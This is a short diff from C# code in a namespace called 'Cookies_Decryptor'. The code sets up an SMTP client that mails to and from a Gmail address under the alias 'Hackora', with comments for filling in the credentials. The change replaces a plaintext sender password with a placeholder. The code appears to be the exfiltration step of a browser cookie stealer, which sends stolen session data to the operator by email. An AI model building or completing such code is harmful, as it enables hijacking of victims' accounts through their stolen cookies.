@@ -11,7 +11,7 @@ namespace Cookies_Decryptor
 
             var fromAddress = new MailAddress("hackora122@gmail.com", "Hackora"); // -> put sender email here
             var toAddress = new MailAddress("hackora122@gmail.com", "Hackora"); // -> put receiver email here
-            const string fromPassword = "TestIgnore2"; // -> put sender password here
+            const string fromPassword = "###########"; // -> put sender password here
 
             var smtp = new SmtpClient
             {
